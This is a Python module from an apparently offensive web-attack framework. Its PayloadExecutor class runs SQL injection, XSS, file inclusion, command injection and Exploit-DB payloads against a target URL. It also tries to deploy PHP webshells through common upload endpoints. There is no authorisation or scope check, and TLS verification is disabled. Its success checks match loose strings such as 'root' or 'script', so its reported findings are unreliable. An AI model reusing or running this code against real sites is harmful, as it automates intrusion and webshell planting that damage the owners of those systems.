#!/usr/bin/env python3

import os
import sys
import time
import json
import requests
import re
import urllib.parse
from typing import Dict, List, Optional

# Add the project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))))

from lib.core.settings import logger, set_color

class PayloadExecutor:
    """
    Executes all fetched online payloads against target systems
    Takes payloads from DynamicPayloadFetcher and implements them on targets
    """
    
    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.session = requests.Session()
        self.successful_payloads = []
        self.failed_payloads = []
        
        # Configure session
        self.session.headers.update({
            'User-Agent': self.config.get('user_agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        
        if self.config.get('proxy'):
            self.session.proxies = {'http': self.config['proxy'], 'https': self.config['proxy']}
        
        self.timeout = self.config.get('timeout', 15)
        self.delay = self.config.get('delay', 0.5)
    
    def execute_all_payloads(self, target_url: str, fetched_payloads: Dict) -> Dict:
        """Execute all fetched payloads against target URL"""
        logger.info(set_color("Starting comprehensive payload execution against target", level=35))
        
        execution_summary = {
            'target': target_url,
            'start_time': time.time(),
            'payloads_executed': 0,
            'successful_exploits': 0,
            'vulnerabilities_found': [],
            'detailed_results': {}
        }
        
        # Execute SQL Injection payloads
        if 'sql_injection' in fetched_payloads and fetched_payloads['sql_injection']:
            sql_payloads = list(fetched_payloads['sql_injection']) if isinstance(fetched_payloads['sql_injection'], set) else fetched_payloads['sql_injection']
            logger.info(set_color(f"Testing {len(sql_payloads)} SQL Injection payloads from online sources", level=35))
            sql_results = self._execute_sql_payloads(target_url, sql_payloads)
            execution_summary['detailed_results']['sql_injection'] = sql_results
            execution_summary['payloads_executed'] += len(sql_payloads)
            
            if sql_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(sql_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'SQL Injection',
                    'severity': 'Critical',
                    'payloads': sql_results['successful_payloads'][:5]
                })
        
        # Execute XSS payloads
        if 'xss' in fetched_payloads and fetched_payloads['xss']:
            xss_payloads = list(fetched_payloads['xss']) if isinstance(fetched_payloads['xss'], set) else fetched_payloads['xss']
            logger.info(set_color(f"Testing {len(xss_payloads)} XSS payloads from online sources", level=35))
            xss_results = self._execute_xss_payloads(target_url, xss_payloads)
            execution_summary['detailed_results']['xss'] = xss_results
            execution_summary['payloads_executed'] += len(xss_payloads)
            
            if xss_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(xss_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'payloads': xss_results['successful_payloads'][:5]
                })
        
        # Execute LFI/RFI payloads
        if 'lfi_rfi' in fetched_payloads and fetched_payloads['lfi_rfi']:
            lfi_payloads = list(fetched_payloads['lfi_rfi']) if isinstance(fetched_payloads['lfi_rfi'], set) else fetched_payloads['lfi_rfi']
            logger.info(set_color(f"Testing {len(lfi_payloads)} LFI/RFI payloads from online sources", level=35))
            lfi_results = self._execute_lfi_rfi_payloads(target_url, lfi_payloads)
            execution_summary['detailed_results']['lfi_rfi'] = lfi_results
            execution_summary['payloads_executed'] += len(lfi_payloads)
            
            if lfi_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(lfi_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Local/Remote File Inclusion',
                    'severity': 'Critical',
                    'payloads': lfi_results['successful_payloads'][:5]
                })
        
        # Execute Command Injection payloads
        if 'command_injection' in fetched_payloads and fetched_payloads['command_injection']:
            cmd_payloads = list(fetched_payloads['command_injection']) if isinstance(fetched_payloads['command_injection'], set) else fetched_payloads['command_injection']
            logger.info(set_color(f"Testing {len(cmd_payloads)} Command Injection payloads from online sources", level=35))
            cmd_results = self._execute_cmd_injection_payloads(target_url, cmd_payloads)
            execution_summary['detailed_results']['command_injection'] = cmd_results
            execution_summary['payloads_executed'] += len(cmd_payloads)
            
            if cmd_results['successful_payloads']:
                execution_summary['successful_exploits'] += len(cmd_results['successful_payloads'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Command Injection',
                    'severity': 'Critical',
                    'payloads': cmd_results['successful_payloads'][:5]
                })
        
        # Deploy Webshells from online sources
        if 'webshells' in fetched_payloads and fetched_payloads['webshells']:
            webshell_list = list(fetched_payloads['webshells']) if isinstance(fetched_payloads['webshells'], set) else fetched_payloads['webshells']
            logger.info(set_color(f"Deploying {len(webshell_list)} webshells from online repositories", level=35))
            webshell_results = self._deploy_webshells(target_url, webshell_list)
            execution_summary['detailed_results']['webshell_deployment'] = webshell_results
            execution_summary['payloads_executed'] += len(webshell_list)
            
            if webshell_results['successful_deployments']:
                execution_summary['successful_exploits'] += len(webshell_results['successful_deployments'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Webshell Deployment',
                    'severity': 'Critical',
                    'payloads': webshell_results['successful_deployments'][:3]
                })
        
        # Execute Exploits from online exploit databases
        if 'exploits' in fetched_payloads and fetched_payloads['exploits']:
            exploit_list = list(fetched_payloads['exploits']) if isinstance(fetched_payloads['exploits'], set) else fetched_payloads['exploits']
            logger.info(set_color(f"Executing {len(exploit_list)} exploits from online databases (Exploit-DB, etc.)", level=35))
            exploit_results = self._execute_exploits(target_url, exploit_list)
            execution_summary['detailed_results']['exploit_execution'] = exploit_results
            execution_summary['payloads_executed'] += len(exploit_list)
            
            if exploit_results['successful_exploits']:
                execution_summary['successful_exploits'] += len(exploit_results['successful_exploits'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Exploit Execution',
                    'severity': 'Critical',
                    'payloads': exploit_results['successful_exploits'][:5]
                })
        
        # Execute Nuclei Templates if available
        if 'nuclei_templates' in fetched_payloads and fetched_payloads['nuclei_templates']:
            nuclei_list = list(fetched_payloads['nuclei_templates']) if isinstance(fetched_payloads['nuclei_templates'], set) else fetched_payloads['nuclei_templates']
            logger.info(set_color(f"Executing {len(nuclei_list)} Nuclei templates from online sources", level=35))
            nuclei_results = self._execute_nuclei_templates(target_url, nuclei_list)
            execution_summary['detailed_results']['nuclei_templates'] = nuclei_results
            execution_summary['payloads_executed'] += len(nuclei_list)
            
            if nuclei_results['successful_templates']:
                execution_summary['successful_exploits'] += len(nuclei_results['successful_templates'])
                execution_summary['vulnerabilities_found'].append({
                    'type': 'Nuclei Template Match',
                    'severity': 'Varies',
                    'payloads': nuclei_results['successful_templates'][:5]
                })
        
        execution_summary['end_time'] = time.time()
        execution_summary['duration'] = execution_summary['end_time'] - execution_summary['start_time']
        
        logger.info(set_color(f"Payload execution completed - {execution_summary['successful_exploits']} successful exploits found", level=35))
        
        return execution_summary
    
    def _execute_sql_payloads(self, target_url: str, sql_payloads: List[str]) -> Dict:
        """Execute SQL injection payloads"""
        results = {
            'total_payloads': len(sql_payloads),
            'successful_payloads': []
        }
        
        # Find potential SQL injection parameters
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:3]:  # Test first 3 parameters
            url = param_data['url']
            param = param_data['parameter']
            
            logger.debug(set_color(f"Testing SQL payloads on parameter: {param}", level=35))
            
            # Test ALL SQL payloads - this is what implements the online payloads
            if self.config.get('fast_mode'):
                total_payloads = min(len(sql_payloads), 20)  # Fast mode: 20 payloads
            elif self.config.get('comprehensive_mode'):
                total_payloads = len(sql_payloads)  # Comprehensive: ALL payloads
            else:
                total_payloads = min(len(sql_payloads), 100)  # Default: 100 payloads
            logger.info(set_color(f"Testing {total_payloads} SQL injection payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(sql_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload or clean_payload.startswith('#'):
                        continue
                    
                    # Show progress every 25 payloads
                    if i % 25 == 0 and i > 0:
                        logger.info(set_color(f"Progress: {i}/{total_payloads} SQL payloads tested on {param}", level=25))
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_sql_injection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"SQL injection found with payload: {clean_payload[:50]}...", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_xss_payloads(self, target_url: str, xss_payloads: List[str]) -> Dict:
        """Execute XSS payloads"""
        results = {
            'total_payloads': len(xss_payloads),
            'successful_payloads': []
        }
        
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:3]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL XSS payloads - this implements the comprehensive online payload collection
            if self.config.get('fast_mode'):
                total_payloads = min(len(xss_payloads), 15)  # Fast mode: 15 payloads
            elif self.config.get('comprehensive_mode'):
                total_payloads = len(xss_payloads)  # Comprehensive: ALL payloads
            else:
                total_payloads = min(len(xss_payloads), 100)  # Default: 100 payloads
            logger.info(set_color(f"Testing {total_payloads} XSS payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(xss_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    # Show progress every 50 payloads for XSS
                    if i % 50 == 0 and i > 0:
                        logger.info(set_color(f"Progress: {i}/{total_payloads} XSS payloads tested on {param}", level=25))
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_xss_reflection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"XSS found with payload: {clean_payload[:50]}...", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_lfi_rfi_payloads(self, target_url: str, lfi_payloads: List[str]) -> Dict:
        """Execute LFI/RFI payloads"""
        results = {
            'total_payloads': len(lfi_payloads),
            'successful_payloads': []
        }
        
        file_parameters = self._find_file_inclusion_parameters(target_url)
        
        for param_data in file_parameters[:2]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL LFI payloads - implement the complete online collection  
            total_payloads = min(len(lfi_payloads), 50) if not self.config.get('comprehensive_mode') else len(lfi_payloads)
            logger.info(set_color(f"Testing {total_payloads} LFI/RFI payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(lfi_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_file_inclusion(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"LFI found with payload: {clean_payload}", level=35))
                    
                    time.sleep(self.delay)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _execute_cmd_injection_payloads(self, target_url: str, cmd_payloads: List[str]) -> Dict:
        """Execute command injection payloads"""
        results = {
            'total_payloads': len(cmd_payloads),
            'successful_payloads': []
        }
        
        test_parameters = self._find_injection_parameters(target_url)
        
        for param_data in test_parameters[:2]:
            url = param_data['url']
            param = param_data['parameter']
            
            # Test ALL command injection payloads - full implementation of online collection
            total_payloads = min(len(cmd_payloads), 50) if not self.config.get('comprehensive_mode') else len(cmd_payloads)
            logger.info(set_color(f"Testing {total_payloads} command injection payloads on parameter {param}", level=35))
            
            for i, payload in enumerate(cmd_payloads[:total_payloads]):
                try:
                    clean_payload = payload.strip()
                    if not clean_payload:
                        continue
                    
                    test_url = self._inject_into_parameter(url, param, clean_payload)
                    response = self.session.get(test_url, timeout=self.timeout)
                    
                    if self._check_command_injection(response, clean_payload):
                        results['successful_payloads'].append({
                            'payload': clean_payload,
                            'parameter': param,
                            'url': test_url
                        })
                        logger.info(set_color(f"Command injection found with payload: {clean_payload}", level=35))
                    
                    time.sleep(self.delay * 2)
                    
                except Exception as e:
                    continue
        
        return results
    
    def _deploy_webshells(self, target_url: str, webshells: List[Dict]) -> Dict:
        """Deploy webshells to target system"""
        results = {
            'total_webshells': len(webshells),
            'successful_deployments': [],
            'deployment_urls': []
        }
        
        logger.info(set_color(f"Attempting to deploy {len(webshells)} webshells from online repositories", level=35))
        
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        # Common webshell upload endpoints
        upload_paths = [
            '/upload.php', '/fileupload.php', '/admin/upload.php', '/wp-admin/admin-ajax.php',
            '/uploader.php', '/file_upload.php', '/upload/', '/files/upload.php'
        ]
        
        for webshell in webshells[:5]:  # Deploy first 5 webshells
            try:
                if isinstance(webshell, dict) and 'content' in webshell:
                    shell_name = webshell.get('name', f'shell_{int(time.time())}.php')
                    shell_content = webshell['content']
                    
                    logger.info(set_color(f"Deploying webshell: {shell_name}", level=35))
                    
                    # Try different upload methods
                    for upload_path in upload_paths[:3]:
                        upload_url = base_url + upload_path
                        
                        try:
                            # Method 1: POST file upload
                            files = {'file': (shell_name, shell_content, 'application/x-php')}
                            response = self.session.post(upload_url, files=files, timeout=self.timeout)
                            
                            if response.status_code == 200 and 'success' in response.text.lower():
                                shell_url = base_url + '/' + shell_name
                                
                                # Verify webshell is accessible
                                verify_response = self.session.get(shell_url, timeout=self.timeout)
                                if verify_response.status_code == 200:
                                    results['successful_deployments'].append({
                                        'name': shell_name,
                                        'url': shell_url,
                                        'upload_method': 'POST file upload',
                                        'upload_endpoint': upload_url
                                    })
                                    results['deployment_urls'].append(shell_url)
                                    logger.info(set_color(f"Webshell deployed successfully: {shell_url}", level=35))
                                    break
                            
                            time.sleep(self.delay)
                            
                        except Exception as e:
                            continue
                
            except Exception as e:
                continue
        
        return results
    
    # Helper methods
    def _find_injection_parameters(self, target_url: str) -> List[Dict]:
        """Find potential injection parameters"""
        from urllib.parse import urlparse, parse_qs
        
        parameters = []
        parsed = urlparse(target_url)
        
        # Parse existing parameters
        if parsed.query:
            params = parse_qs(parsed.query)
            for param_name, param_values in params.items():
                param_value = param_values[0] if param_values else 'test'
                parameters.append({
                    'url': target_url,
                    'parameter': param_name,
                    'value': param_value,
                    'method': 'GET'
                })
        
        # Add common parameters
        common_params = ['id', 'user', 'page', 'search', 'q', 'file', 'cmd']
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in common_params:
            parameters.append({
                'url': f"{base_url}?{param}=test",
                'parameter': param,
                'value': 'test',
                'method': 'GET'
            })
        
        return parameters
    
    def _find_file_inclusion_parameters(self, target_url: str) -> List[Dict]:
        """Find file inclusion parameters"""
        file_params = ['file', 'page', 'include', 'path', 'doc']
        from urllib.parse import urlparse
        
        parameters = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for param in file_params:
            parameters.append({
                'url': f"{base_url}?{param}=test",
                'parameter': param,
                'value': 'test',
                'method': 'GET'
            })
        
        return parameters
    
    def _inject_into_parameter(self, url: str, parameter: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        try:
            from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
            
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            encoded_payload = urllib.parse.quote(payload)
            params[parameter] = [encoded_payload]
            
            new_query = urlencode(params, doseq=True)
            new_parsed = parsed._replace(query=new_query)
            
            return urlunparse(new_parsed)
            
        except Exception as e:
            # Fallback
            separator = '&' if '?' in url else '?'
            return f"{url}{separator}{parameter}={urllib.parse.quote(payload)}"
    
    def _check_sql_injection(self, response: requests.Response, payload: str) -> bool:
        """Check if SQL injection was successful"""
        sql_indicators = [
            'mysql_fetch_array', 'mysql_num_rows', 'warning: mysql_',
            'ora-01756', 'oracle error', 'microsoft ole db provider',
            'sqlserver jdbc driver', 'postgresql query failed',
            'sqlite_query', 'syntax error', 'unexpected token'
        ]
        
        response_text = response.text.lower()
        return any(indicator in response_text for indicator in sql_indicators)
    
    def _check_xss_reflection(self, response: requests.Response, payload: str) -> bool:
        """Check if XSS payload was reflected"""
        if payload in response.text:
            return True
        
        import html
        encoded_payload = html.escape(payload)
        if encoded_payload in response.text:
            return True
        
        return 'script' in payload.lower() and 'script' in response.text.lower()
    
    def _check_file_inclusion(self, response: requests.Response, payload: str) -> bool:
        """Check if file inclusion was successful"""
        file_indicators = [
            'root:x:', 'daemon:x:', '/bin/bash', '/bin/sh',
            '[boot loader]', 'linux version', 'processor',
            '<?php', 'function ', 'class '
        ]
        
        return any(indicator in response.text for indicator in file_indicators)
    
    def _check_command_injection(self, response: requests.Response, payload: str) -> bool:
        """Check if command injection was successful"""
        command_indicators = [
            'uid=', 'gid=', 'groups=', 'total ', 'drwx', '-rwx',
            'linux', 'darwin', 'windows nt', 'root', 'www-data', 'apache'
        ]
        
        return any(indicator in response.text.lower() for indicator in command_indicators)
    
    def _execute_exploits(self, target_url: str, exploits: List[Dict]) -> Dict:
        """Execute exploits from online exploit databases (Exploit-DB, etc.)"""
        results = {
            'total_exploits': len(exploits),
            'successful_exploits': []
        }
        
        logger.info(set_color(f"Testing {len(exploits)} exploits from Exploit-DB and other sources", level=35))
        
        # For comprehensive mode, test all exploits; for fast mode, sample
        if self.config.get('fast_mode'):
            exploits_to_test = exploits[:500]  # Test first 500 in fast mode
            logger.info(set_color(f"Fast mode: Testing {len(exploits_to_test)} exploits", level=35))
        elif self.config.get('comprehensive_mode'):
            exploits_to_test = exploits  # Test all exploits
            logger.info(set_color(f"Comprehensive mode: Testing all {len(exploits_to_test)} exploits", level=35))
        else:
            exploits_to_test = exploits[:1000]  # Default: test first 1000
            logger.info(set_color(f"Testing {len(exploits_to_test)} exploits", level=35))
        
        tested = 0
        for exploit in exploits_to_test:
            try:
                # Exploits can be strings or dictionaries
                if isinstance(exploit, dict):
                    exploit_id = exploit.get('id', 'unknown')
                    exploit_type = exploit.get('type', 'generic')
                    exploit_payload = exploit.get('payload', exploit.get('code', ''))
                else:
                    exploit_id = 'unknown'
                    exploit_type = 'generic'
                    exploit_payload = str(exploit)
                
                # Try to execute the exploit
                success = self._test_exploit_payload(target_url, exploit_payload, exploit_type)
                
                if success:
                    results['successful_exploits'].append({
                        'id': exploit_id,
                        'type': exploit_type,
                        'payload': exploit_payload[:100]  # Store first 100 chars
                    })
                    logger.info(set_color(f"[+] Exploit {exploit_id} successful!", level=25))
                
                tested += 1
                if tested % 100 == 0:
                    logger.debug(set_color(f"Progress: {tested}/{len(exploits_to_test)} exploits tested", level=10))
                
            except Exception as e:
                logger.debug(set_color(f"Exploit test error: {str(e)}", level=10))
                continue
        
        logger.info(set_color(f"Exploit testing complete: {len(results['successful_exploits'])} successful out of {tested} tested", level=35))
        return results
    
    def _execute_nuclei_templates(self, target_url: str, nuclei_templates: List) -> Dict:
        """Execute Nuclei templates from online sources"""
        results = {
            'total_templates': len(nuclei_templates),
            'successful_templates': []
        }
        
        logger.info(set_color(f"Testing {len(nuclei_templates)} Nuclei templates", level=35))
        
        # For comprehensive mode, test all templates; for fast mode, sample
        if self.config.get('fast_mode'):
            templates_to_test = nuclei_templates[:50]  # Test first 50 in fast mode
        elif self.config.get('comprehensive_mode'):
            templates_to_test = nuclei_templates  # Test all templates
        else:
            templates_to_test = nuclei_templates[:100]  # Default: test first 100
        
        tested = 0
        for template in templates_to_test:
            try:
                # Templates can be strings or dictionaries
                if isinstance(template, dict):
                    template_id = template.get('id', template.get('name', 'unknown'))
                    template_type = template.get('info', {}).get('severity', 'info')
                    template_requests = template.get('requests', [])
                else:
                    template_id = 'unknown'
                    template_type = 'info'
                    template_requests = []
                
                # Try to match the template
                success = self._test_nuclei_template(target_url, template)
                
                if success:
                    results['successful_templates'].append({
                        'id': template_id,
                        'severity': template_type,
                        'template': str(template)[:100]
                    })
                    logger.info(set_color(f"[+] Nuclei template {template_id} matched!", level=25))
                
                tested += 1
                if tested % 20 == 0:
                    logger.debug(set_color(f"Progress: {tested}/{len(templates_to_test)} templates tested", level=10))
                
            except Exception as e:
                logger.debug(set_color(f"Template test error: {str(e)}", level=10))
                continue
        
        logger.info(set_color(f"Nuclei template testing complete: {len(results['successful_templates'])} matched out of {tested} tested", level=35))
        return results
    
    def _test_exploit_payload(self, target_url: str, exploit_payload: str, exploit_type: str) -> bool:
        """Test a specific exploit payload against the target"""
        try:
            # Find injection points in the URL
            test_params = self._find_injection_parameters(target_url)
            
            if not test_params:
                # No parameters, try path-based exploitation
                test_url = target_url.rstrip('/') + '/' + exploit_payload
                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False, allow_redirects=True)
                    return self._check_exploit_success(response, exploit_type)
                except:
                    return False
            
            # Test payload in each parameter
            for param_data in test_params[:2]:  # Test first 2 parameters
                url = param_data['url']
                param = param_data['parameter']
                
                # Inject payload
                if '?' in url:
                    test_url = url.replace(f"{param}={param_data['value']}", f"{param}={exploit_payload}")
                else:
                    test_url = f"{url}?{param}={exploit_payload}"
                
                try:
                    response = requests.get(test_url, timeout=self.timeout, verify=False, allow_redirects=True)
                    
                    if self._check_exploit_success(response, exploit_type):
                        return True
                        
                except:
                    continue
            
            return False
            
        except Exception as e:
            logger.debug(set_color(f"Exploit test error: {str(e)}", level=10))
            return False
    
    def _test_nuclei_template(self, target_url: str, template) -> bool:
        """Test a Nuclei template against the target"""
        try:
            # Simplified nuclei template matching
            # In a real implementation, you'd parse the template and execute its requests
            
            # For now, just make a basic request and check for common vulnerability indicators
            response = requests.get(target_url, timeout=self.timeout, verify=False)
            
            # Check for basic vulnerability indicators
            indicators = [
                'error', 'exception', 'warning', 'debug', 'stack trace',
                'sql syntax', 'mysql', 'postgresql', 'oracle',
                'phpinfo()', 'root:', 'passwd', 'etc/passwd'
            ]
            
            return any(indicator in response.text.lower() for indicator in indicators)
            
        except Exception as e:
            logger.debug(set_color(f"Template test error: {str(e)}", level=10))
            return False
    
    def _check_exploit_success(self, response: requests.Response, exploit_type: str) -> bool:
        """Check if an exploit was successful based on response"""
        # Generic success indicators
        success_indicators = [
            'pwned', 'hacked', 'exploited', 'success',
            'shell', 'command executed', 'root',
            'administrator', 'system', 'uid=',
            'gid=', 'groups='
        ]
        
        # Type-specific checks
        if 'sql' in exploit_type.lower():
            return self._check_sql_injection(response, '')
        elif 'xss' in exploit_type.lower():
            return 'script' in response.text.lower()
        elif 'lfi' in exploit_type.lower() or 'rfi' in exploit_type.lower():
            return self._check_file_inclusion(response, '')
        elif 'command' in exploit_type.lower() or 'rce' in exploit_type.lower():
            return self._check_command_injection(response, '')
        else:
            # Generic check
            return any(indicator in response.text.lower() for indicator in success_indicators)
